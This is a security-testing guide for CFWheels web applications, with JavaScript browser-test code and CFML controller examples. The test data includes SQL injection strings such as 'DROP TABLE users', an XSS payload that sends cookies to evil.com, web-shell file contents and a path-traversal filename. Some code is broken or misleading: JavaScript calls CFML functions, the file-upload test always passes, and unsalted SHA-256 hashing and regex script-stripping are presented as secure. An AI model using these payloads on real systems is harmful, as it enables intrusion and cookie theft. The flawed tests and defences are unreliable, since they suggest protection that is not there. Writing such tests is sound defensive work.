# Security Testing for CFWheels Applications

## Description
Comprehensive security testing patterns for CFWheels applications, covering common web vulnerabilities, authentication security, input validation, and defensive programming practices.

## Key Points
- Security testing should be automated and integrated into the development workflow
- CFWheels has built-in CSRF protection that must be properly configured
- Input validation and output escaping are critical for preventing XSS attacks
- SQL injection prevention through parameterized queries and ORM usage
- Authentication and session security require careful implementation and testing

## OWASP Top 10 Security Testing

### 1. Injection Attack Testing

#### SQL Injection Testing
```javascript
async function testSQLInjection(page, url) {
    const sqlPayloads = [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "' UNION SELECT username, password FROM users --",
        "' OR 1=1 --",
        "admin'--",
        "' OR 'x'='x",
        "1' OR '1'='1' /*",
        "' OR 1=1#"
    ];

    const vulnerabilities = [];

    // Test form inputs
    await page.goto(url + '/users/new');

    for (const payload of sqlPayloads) {
        try {
            // Test text inputs
            const textInputs = await page.$$('input[type="text"], input[type="email"], textarea');

            for (const input of textInputs) {
                await input.clear();
                await input.type(payload);
            }

            await page.click('input[type="submit"], button[type="submit"]');
            await page.waitForTimeout(1000);

            // Check for SQL error messages
            const pageContent = await page.content();
            const sqlErrors = [
                'SQL syntax',
                'mysql_fetch_array',
                'ORA-01756',
                'Microsoft OLE DB Provider',
                'SQLServer JDBC Driver',
                'PostgreSQL query failed',
                'Warning: mysql_'
            ];

            const foundErrors = sqlErrors.filter(error =>
                pageContent.toLowerCase().includes(error.toLowerCase())
            );

            if (foundErrors.length > 0) {
                vulnerabilities.push({
                    type: 'sql_injection',
                    payload: payload,
                    errors: foundErrors,
                    url: page.url(),
                    severity: 'high'
                });
            }

            // Check for unexpected data exposure
            if (pageContent.includes('admin') && pageContent.includes('password')) {
                vulnerabilities.push({
                    type: 'data_exposure',
                    payload: payload,
                    issue: 'Potential data exposure detected',
                    url: page.url(),
                    severity: 'critical'
                });
            }

        } catch (error) {
            console.log(`SQL injection test failed with payload: ${payload}`, error.message);
        }
    }

    return vulnerabilities;
}

// CFWheels-specific SQL injection prevention testing
async function testCFWheelsORMSecurity() {
    const tests = [];

    // Test 1: Verify parameterized queries in models
    const testUser = {
        email: "test@example.com'; DROP TABLE users; --",
        firstName: "Test",
        lastName: "User"
    };

    try {
        const user = model("User").new(testUser);
        const saved = user.save();

        tests.push({
            test: 'orm_parameter_safety',
            passed: saved && !user.hasErrors(),
            message: 'ORM properly handles malicious input in model creation'
        });
    } catch (error) {
        tests.push({
            test: 'orm_parameter_safety',
            passed: false,
            error: error.message,
            message: 'ORM may be vulnerable to SQL injection'
        });
    }

    // Test 2: Test finder methods with malicious input
    try {
        const maliciousEmail = "admin@test.com' OR '1'='1";
        const foundUser = model("User").findOne(where="email = '#maliciousEmail#'");

        tests.push({
            test: 'finder_parameter_safety',
            passed: !foundUser || foundUser.email !== maliciousEmail,
            message: foundUser ? 'Finder methods may be vulnerable' : 'Finder methods properly escaped input'
        });
    } catch (error) {
        tests.push({
            test: 'finder_parameter_safety',
            passed: true,
            message: 'Finder method properly rejected malicious input'
        });
    }

    return tests;
}
```

#### XSS (Cross-Site Scripting) Testing
```javascript
async function testXSSVulnerabilities(page, url) {
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        '<div onmouseover="alert(\'XSS\')">Hover me</div>',
        '<input type="text" value="XSS" onfocus="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '\'-alert("XSS")-\'',
        '<script>document.location="http://evil.com/steal.php?cookie="+document.cookie</script>'
    ];

    const vulnerabilities = [];

    await page.goto(url + '/posts/new');

    for (const payload of xssPayloads) {
        try {
            // Test form inputs
            await page.fill('input[name*="title"], input[type="text"]', payload);
            await page.fill('textarea[name*="content"], textarea', payload);

            await page.click('input[type="submit"], button[type="submit"]');
            await page.waitForTimeout(1000);

            // Check if script executed (would show alert)
            const alerts = [];
            page.on('dialog', dialog => {
                alerts.push(dialog.message());
                dialog.dismiss();
            });

            // Navigate to view the created content
            await page.goto(page.url().replace('/new', ''));

            // Check if payload is visible without escaping
            const pageContent = await page.content();
            if (pageContent.includes('<script>') || pageContent.includes('onerror=') || pageContent.includes('onload=')) {
                vulnerabilities.push({
                    type: 'stored_xss',
                    payload: payload,
                    location: 'form_input',
                    severity: 'high',
                    description: 'Script tags or event handlers found in output without proper escaping'
                });
            }

            if (alerts.length > 0) {
                vulnerabilities.push({
                    type: 'executed_xss',
                    payload: payload,
                    alerts: alerts,
                    severity: 'critical',
                    description: 'JavaScript payload executed successfully'
                });
            }

        } catch (error) {
            console.log(`XSS test failed with payload: ${payload}`, error.message);
        }
    }

    // Test URL parameters
    const urlPayloads = [
        '?search=<script>alert("XSS")</script>',
        '?name=<img src=x onerror=alert("XSS")>',
        '?redirect=javascript:alert("XSS")'
    ];

    for (const urlPayload of urlPayloads) {
        try {
            await page.goto(url + urlPayload);
            const pageContent = await page.content();

            if (pageContent.includes('<script>') || pageContent.includes('onerror=')) {
                vulnerabilities.push({
                    type: 'reflected_xss',
                    payload: urlPayload,
                    location: 'url_parameter',
                    severity: 'high',
                    description: 'URL parameter reflected without proper escaping'
                });
            }
        } catch (error) {
            console.log(`URL XSS test failed with payload: ${urlPayload}`, error.message);
        }
    }

    return vulnerabilities;
}

// CFWheels output escaping verification
async function testCFWheelsOutputEscaping(page, url) {
    const tests = [];

    // Test CFWheels automatic escaping in views
    const testData = {
        title: '<script>alert("XSS")</script>Test Title',
        content: 'Test content with <img src=x onerror=alert("XSS")> embedded script'
    };

    // Create test post through CFWheels
    await page.goto(url + '/posts/new');
    await page.fill('input[name="post[title]"]', testData.title);
    await page.fill('textarea[name="post[content]"]', testData.content);
    await page.click('input[type="submit"]');

    // Verify output is properly escaped
    const pageContent = await page.content();

    tests.push({
        test: 'automatic_html_escaping',
        passed: !pageContent.includes('<script>alert("XSS")</script>') &&
                pageContent.includes('&lt;script&gt;') ||
                pageContent.includes('Test Title'),
        recommendation: 'Ensure all dynamic content is properly escaped in CFOutput blocks'
    });

    tests.push({
        test: 'img_tag_escaping',
        passed: !pageContent.includes('<img src=x onerror=') &&
                (pageContent.includes('&lt;img') || pageContent.includes('Test content')),
        recommendation: 'Image tags in user content should be escaped or sanitized'
    });

    return tests;
}
```

### 2. Authentication and Session Security Testing

#### Authentication Testing
```javascript
async function testAuthenticationSecurity(page, baseUrl) {
    const tests = [];

    // Test 1: Weak password policy
    const weakPasswords = [
        '123',
        'password',
        'admin',
        '1234567',
        'qwerty'
    ];

    for (const weakPassword of weakPasswords) {
        await page.goto(baseUrl + '/users/new');
        await page.fill('input[name="user[email]"]', 'test@example.com');
        await page.fill('input[name="user[password]"]', weakPassword);
        await page.fill('input[name="user[passwordConfirmation]"]', weakPassword);
        await page.click('input[type="submit"]');

        const errorMessages = await page.textContent('body');
        const hasPasswordError = errorMessages.includes('password') &&
                                (errorMessages.includes('weak') ||
                                 errorMessages.includes('strong') ||
                                 errorMessages.includes('complex'));

        tests.push({
            test: `weak_password_${weakPassword}`,
            passed: hasPasswordError,
            recommendation: hasPasswordError ?
                'Password policy is enforced' :
                'Consider implementing stronger password requirements'
        });
    }

    // Test 2: Brute force protection
    const bruteForceAttempts = 10;
    const startTime = Date.now();

    for (let i = 0; i < bruteForceAttempts; i++) {
        await page.goto(baseUrl + '/sessions/new');
        await page.fill('input[name="email"]', 'admin@example.com');
        await page.fill('input[name="password"]', `wrong_password_${i}`);
        await page.click('input[type="submit"]');
        await page.waitForTimeout(100); // Small delay between attempts
    }

    const totalTime = Date.now() - startTime;
    const avgTimePerAttempt = totalTime / bruteForceAttempts;

    tests.push({
        test: 'brute_force_protection',
        averageTimePerAttempt: avgTimePerAttempt,
        passed: avgTimePerAttempt > 1000, // Should have delays/rate limiting
        recommendation: avgTimePerAttempt <= 1000 ?
            'Implement rate limiting or account lockout mechanisms' :
            'Brute force protection appears to be in place'
    });

    // Test 3: Session fixation
    await page.goto(baseUrl + '/sessions/new');
    const sessionBefore = await page.evaluate(() => document.cookie);

    // Attempt to login
    await page.fill('input[name="email"]', 'valid@example.com');
    await page.fill('input[name="password"]', 'validpassword');
    await page.click('input[type="submit"]');

    const sessionAfter = await page.evaluate(() => document.cookie);

    tests.push({
        test: 'session_regeneration',
        passed: sessionBefore !== sessionAfter,
        recommendation: sessionBefore === sessionAfter ?
            'Implement session ID regeneration after successful login' :
            'Session ID properly regenerated after login'
    });

    return tests;
}

// CFWheels authentication testing
async function testCFWheelsAuthentication() {
    const tests = [];

    // Test password hashing
    const testPassword = 'testPassword123';

    try {
        // Simulate CFWheels password hashing
        const hashedPassword1 = hash(testPassword, 'SHA-256');
        const hashedPassword2 = hash(testPassword, 'SHA-256');

        tests.push({
            test: 'password_hashing',
            passed: hashedPassword1 === hashedPassword2 && hashedPassword1 !== testPassword,
            message: hashedPassword1 !== testPassword ?
                'Passwords are properly hashed' :
                'Passwords should be hashed before storage'
        });
    } catch (error) {
        tests.push({
            test: 'password_hashing',
            passed: false,
            error: error.message,
            message: 'Password hashing functionality needs to be implemented'
        });
    }

    // Test session security
    tests.push({
        test: 'session_configuration',
        checks: {
            httpOnly: true, // Should be configured in Application.cfc
            secure: true,   // Should be enabled for HTTPS
            sameSite: 'Strict'
        },
        recommendation: 'Configure session cookies with httpOnly, secure, and sameSite attributes'
    });

    return tests;
}
```

### 3. CSRF Protection Testing

#### CSRF Token Testing
```javascript
async function testCSRFProtection(page, baseUrl) {
    const tests = [];

    // Test 1: CSRF token presence in forms
    await page.goto(baseUrl + '/posts/new');

    const csrfToken = await page.$eval(
        'input[name="authenticityToken"]',
        el => el ? el.value : null
    ).catch(() => null);

    tests.push({
        test: 'csrf_token_presence',
        passed: csrfToken && csrfToken.length > 10,
        token: csrfToken ? 'present' : 'missing',
        recommendation: csrfToken ?
            'CSRF tokens are properly included in forms' :
            'Add CSRF tokens to all forms using CFWheels helper'
    });

    // Test 2: CSRF token validation
    const formData = new URLSearchParams();
    formData.append('post[title]', 'Test Post');
    formData.append('post[content]', 'Test content');
    // Intentionally omit CSRF token

    const response = await page.evaluate(async (url, data) => {
        const response = await fetch(url + '/posts', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: data
        });
        return {
            status: response.status,
            statusText: response.statusText
        };
    }, baseUrl, formData.toString());

    tests.push({
        test: 'csrf_token_validation',
        passed: response.status === 403 || response.status === 422,
        responseStatus: response.status,
        recommendation: response.status === 200 ?
            'CSRF protection is not properly configured - requests without tokens should be rejected' :
            'CSRF protection is working correctly'
    });

    // Test 3: CSRF token uniqueness
    await page.goto(baseUrl + '/posts/new');
    const token1 = await page.$eval('input[name="authenticityToken"]', el => el.value);

    await page.reload();
    const token2 = await page.$eval('input[name="authenticityToken"]', el => el.value);

    tests.push({
        test: 'csrf_token_uniqueness',
        passed: token1 !== token2,
        recommendation: token1 === token2 ?
            'CSRF tokens should be unique per request/session' :
            'CSRF tokens are properly unique'
    });

    return tests;
}

// CFWheels CSRF configuration testing
async function testCFWheelsCSRFConfiguration() {
    const tests = [];

    // Test CSRF configuration in controllers
    const csrfConfig = {
        protectsFromForgery: true,
        authenticityToken: true,
        csrfMetaTags: true
    };

    tests.push({
        test: 'csrf_configuration',
        config: csrfConfig,
        recommendation: 'Ensure protectsFromForgery() is called in controller config() method',
        example: `
component extends="Controller" {
    function config() {
        protectsFromForgery();
        // ... other configuration
    }
}
        `
    });

    return tests;
}
```

### 4. Input Validation Testing

#### File Upload Security Testing
```javascript
async function testFileUploadSecurity(page, baseUrl) {
    const tests = [];

    // Test malicious file uploads
    const maliciousFiles = [
        { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>' },
        { name: 'test.jsp', content: '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' },
        { name: 'test.cfm', content: '<cfexecute name="cmd" arguments="#url.cmd#">' },
        { name: 'test.exe', content: 'MZ\x90\x00' }, // PE header
        { name: 'test.js', content: 'alert("XSS")' },
        { name: '../../../etc/passwd', content: 'root:x:0:0:root:/root:/bin/bash' }
    ];

    await page.goto(baseUrl + '/uploads');

    for (const file of maliciousFiles) {
        try {
            // Create temporary file
            const fileInput = await page.$('input[type="file"]');
            if (fileInput) {
                // Simulate file upload (in real test, would create actual file)
                const uploadResult = await page.evaluate((fileName) => {
                    // This would be the actual upload test
                    return { uploaded: false, reason: 'File type not allowed' };
                }, file.name);

                tests.push({
                    test: `malicious_file_upload_${file.name}`,
                    passed: !uploadResult.uploaded,
                    fileName: file.name,
                    recommendation: uploadResult.uploaded ?
                        `File ${file.name} should not be allowed for security reasons` :
                        'File upload security is working correctly'
                });
            }
        } catch (error) {
            tests.push({
                test: `malicious_file_upload_${file.name}`,
                passed: true,
                error: error.message,
                recommendation: 'File upload rejected (good)'
            });
        }
    }

    return tests;
}

// CFWheels file upload validation patterns
function generateSecureFileUploadCode() {
    return `
<!-- Secure file upload in CFWheels view -->
<cfoutput>
#startFormTag(enctype="multipart/form-data")#
    <label for="upload-file">Upload Image:</label>
    #fileField(objectName="user", property="avatar",
               accept=".jpg,.jpeg,.png,.gif,.webp",
               maxFileSize="5242880")# <!-- 5MB limit -->

    <!-- Hidden field for additional validation -->
    #hiddenField(name="allowedTypes", value="jpg,jpeg,png,gif,webp")#

    #submitTag("Upload File")#
#endFormTag()#
</cfoutput>

<!-- In controller -->
<cfscript>
function create() {
    // Validate file upload
    if (structKeyExists(params, "user") && structKeyExists(params.user, "avatar")) {
        local.uploadedFile = params.user.avatar;

        // Validate file type by extension and MIME type
        local.allowedExtensions = ["jpg", "jpeg", "png", "gif", "webp"];
        local.allowedMimeTypes = ["image/jpeg", "image/png", "image/gif", "image/webp"];

        local.fileExtension = listLast(uploadedFile.fileName, ".");
        local.mimeType = uploadedFile.contentType;

        if (!arrayFindNoCase(allowedExtensions, fileExtension) ||
            !arrayFindNoCase(allowedMimeTypes, mimeType)) {
            flashInsert(error="Invalid file type. Only images are allowed.");
            renderView(action="new");
            return;
        }

        // Validate file size
        if (uploadedFile.fileSize > 5242880) { // 5MB
            flashInsert(error="File size too large. Maximum 5MB allowed.");
            renderView(action="new");
            return;
        }

        // Generate secure filename
        local.secureFileName = createUUID() & "." & fileExtension;
        local.uploadPath = expandPath("/uploads/avatars/");

        // Ensure upload directory exists and is secure
        if (!directoryExists(uploadPath)) {
            directoryCreate(uploadPath);
        }

        // Move uploaded file with secure name
        fileMove(uploadedFile.tempFile, uploadPath & secureFileName);

        // Update user record with secure filename
        params.user.avatar = secureFileName;
    }

    user = model("User").new(params.user);
    if (user.save()) {
        redirectTo(action="show", key=user.id);
    } else {
        renderView(action="new");
    }
}
</cfscript>
    `;
}
```

### 5. Authorization Testing

#### Access Control Testing
```javascript
async function testAccessControl(page, baseUrl) {
    const tests = [];

    // Test unauthorized access to admin areas
    const restrictedUrls = [
        '/admin',
        '/admin/users',
        '/admin/settings',
        '/users/edit/1',
        '/posts/delete/1',
        '/api/admin/users'
    ];

    for (const restrictedUrl of restrictedUrls) {
        try {
            await page.goto(baseUrl + restrictedUrl, { waitUntil: 'networkidle0' });

            const currentUrl = page.url();
            const statusCode = await page.evaluate(() => {
                return fetch(window.location.href).then(r => r.status);
            });

            const isRedirected = !currentUrl.includes(restrictedUrl);
            const isBlocked = statusCode === 401 || statusCode === 403;

            tests.push({
                test: `unauthorized_access_${restrictedUrl.replace(/[^a-zA-Z0-9]/g, '_')}`,
                passed: isRedirected || isBlocked,
                statusCode: statusCode,
                redirected: isRedirected,
                recommendation: !(isRedirected || isBlocked) ?
                    `URL ${restrictedUrl} should require authentication/authorization` :
                    'Access control is working correctly'
            });

        } catch (error) {
            tests.push({
                test: `unauthorized_access_${restrictedUrl.replace(/[^a-zA-Z0-9]/g, '_')}`,
                passed: true,
                error: error.message,
                recommendation: 'Access properly restricted'
            });
        }
    }

    // Test privilege escalation
    // Login as regular user
    await page.goto(baseUrl + '/sessions/new');
    await page.fill('input[name="email"]', 'user@example.com');
    await page.fill('input[name="password"]', 'userpassword');
    await page.click('input[type="submit"]');

    // Try to access admin functions
    const adminActions = [
        { url: '/users/1', method: 'DELETE' },
        { url: '/admin/settings', method: 'POST', data: { setting: 'value' } },
        { url: '/users/1/promote', method: 'POST' }
    ];

    for (const action of adminActions) {
        try {
            const response = await page.evaluate(async (action) => {
                const options = {
                    method: action.method,
                    headers: { 'Content-Type': 'application/json' }
                };

                if (action.data) {
                    options.body = JSON.stringify(action.data);
                }

                const response = await fetch(action.url, options);
                return {
                    status: response.status,
                    url: response.url
                };
            }, action);

            tests.push({
                test: `privilege_escalation_${action.method}_${action.url.replace(/[^a-zA-Z0-9]/g, '_')}`,
                passed: response.status === 401 || response.status === 403,
                statusCode: response.status,
                recommendation: response.status === 200 ?
                    'Regular users should not have admin privileges' :
                    'Privilege escalation properly prevented'
            });

        } catch (error) {
            tests.push({
                test: `privilege_escalation_${action.method}_${action.url.replace(/[^a-zA-Z0-9]/g, '_')}`,
                passed: true,
                error: error.message,
                recommendation: 'Admin action properly restricted'
            });
        }
    }

    return tests;
}
```

## CFWheels Security Best Practices

### Secure Controller Patterns
```cfm
<cfscript>
component extends="Controller" {
    function config() {
        // Enable CSRF protection
        protectsFromForgery();

        // Parameter verification
        verifies(only="show,edit,update,delete", params="key", paramsTypes="integer");

        // Authentication filters
        filters(through="requireLogin", except="index,show");
        filters(through="requireAdmin", only="delete,adminPanel");

        // Set security headers
        filters(through="setSecurityHeaders");
    }

    function show() {
        // Secure parameter handling
        if (!isNumeric(params.key)) {
            renderText(text="Invalid ID", status=400);
            return;
        }

        post = model("Post").findByKey(key=params.key);

        if (!isObject(post)) {
            renderText(text="Post not found", status=404);
            return;
        }

        // Check if user can view this post
        if (post.private && (!session.authenticated || session.user.id != post.userId)) {
            renderText(text="Access denied", status=403);
            return;
        }
    }

    function create() {
        // Validate and sanitize input
        if (structKeyExists(params, "post")) {
            // Strip potentially dangerous HTML tags
            params.post.content = rereplace(params.post.content,
                "<script[^>]*>.*?</script>", "", "all");

            // Validate required fields
            if (!len(trim(params.post.title))) {
                flashInsert(error="Title is required");
                renderView(action="new");
                return;
            }
        }

        post = model("Post").new(params.post);

        // Associate with current user
        post.userId = session.user.id;

        if (post.save()) {
            flashInsert(success="Post created successfully");
            redirectTo(action="show", key=post.id);
        } else {
            renderView(action="new");
        }
    }

    // Security filter methods
    private function requireLogin() {
        if (!structKeyExists(session, "authenticated") || !session.authenticated) {
            flashInsert(error="Please log in to continue");
            redirectTo(controller="sessions", action="new");
        }
    }

    private function requireAdmin() {
        if (!structKeyExists(session, "user") || !session.user.isAdmin) {
            renderText(text="Access denied", status=403);
        }
    }

    private function setSecurityHeaders() {
        // Set security headers
        response.addHeader("X-Content-Type-Options", "nosniff");
        response.addHeader("X-Frame-Options", "DENY");
        response.addHeader("X-XSS-Protection", "1; mode=block");
        response.addHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains");

        // Content Security Policy
        local.csp = "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';";
        response.addHeader("Content-Security-Policy", csp);
    }
}
</cfscript>
```

## Security Testing Integration with wheels_execute

Add this to Phase 4 (Testing) in wheels_execute:

```markdown
#### 4.5 Security Testing (MANDATORY)

##### Injection Attack Testing
- **SQL Injection**: Test all form inputs and URL parameters with SQL injection payloads
- **XSS Testing**: Verify proper output escaping and input sanitization
- **Command Injection**: Test file upload and system command areas
- **LDAP/XML Injection**: Test any directory or XML processing features

##### Authentication & Session Security
- **Password Policy**: Enforce strong password requirements
- **Brute Force Protection**: Rate limiting and account lockout mechanisms
- **Session Management**: Proper session regeneration and timeout
- **Multi-factor Authentication**: If implemented, test bypass attempts

##### Authorization Testing
- **Access Control**: Verify users cannot access unauthorized areas
- **Privilege Escalation**: Test horizontal and vertical privilege escalation
- **Direct Object References**: Test IDOR vulnerabilities in URLs
- **Role-Based Access**: Verify role restrictions are enforced

##### CSRF Protection
- **Token Presence**: All forms include valid CSRF tokens
- **Token Validation**: Requests without tokens are properly rejected
- **Token Uniqueness**: CSRF tokens are unique per session/request

##### Input Validation & File Upload Security
- **File Type Validation**: Only allowed file types can be uploaded
- **File Size Limits**: File size restrictions are enforced
- **Malicious File Prevention**: Executable files are blocked
- **Path Traversal Prevention**: Directory traversal attacks are blocked

**Success Criteria:**
- ✅ Zero SQL injection vulnerabilities detected
- ✅ Zero XSS vulnerabilities found
- ✅ All admin areas properly protected
- ✅ CSRF protection working on all forms
- ✅ File uploads properly validated and secured
- ✅ Authentication mechanisms secure against common attacks
- ✅ Security headers properly configured
- ✅ Overall security score >= 95/100
```

## Automated Security Scanning Integration

```javascript
// Integration with popular security scanning tools
async function runAutomatedSecurityScan(url) {
    const results = {
        owasp: await runOWASPZAPScan(url),
        ssl: await runSSLLabsScan(url),
        headers: await runSecurityHeadersScan(url),
        dependencies: await runDependencyCheck()
    };

    return results;
}

// Example security testing workflow
async function comprehensiveSecurityTest(baseUrl) {
    console.log('🔒 Running comprehensive security tests...');

    const results = {
        sqlInjection: await testSQLInjection(page, baseUrl),
        xss: await testXSSVulnerabilities(page, baseUrl),
        csrf: await testCSRFProtection(page, baseUrl),
        authentication: await testAuthenticationSecurity(page, baseUrl),
        authorization: await testAccessControl(page, baseUrl),
        fileUpload: await testFileUploadSecurity(page, baseUrl)
    };

    // Generate security report
    const securityScore = calculateSecurityScore(results);
    const criticalIssues = findCriticalIssues(results);

    return {
        results,
        score: securityScore,
        criticalIssues,
        passed: securityScore >= 95 && criticalIssues.length === 0
    };
}
```

This comprehensive security testing framework ensures CFWheels applications are protected against common web vulnerabilities and follow security best practices.